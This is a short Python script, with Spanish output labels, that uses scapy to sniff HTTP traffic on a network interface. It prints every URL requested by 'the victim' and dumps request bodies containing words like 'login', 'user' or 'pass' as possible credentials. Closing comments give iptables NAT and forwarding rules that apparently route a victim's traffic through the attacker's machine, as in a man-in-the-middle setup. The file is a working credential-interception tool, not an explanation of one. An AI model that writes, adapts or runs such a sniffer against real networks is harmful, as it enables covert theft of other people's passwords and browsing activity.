#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo....\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    cred_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"URL visitada por la víctima: {url}", "blue"))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keywords in cred_keywords:
                    if keywords in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", "green"))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0) # prn=pro_re_nata

def main():
    sniff("ens33")

if __name__ == '__main__':
    main()


# iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
# iptables -A FORWARD -i ens33 -j ACCEPT
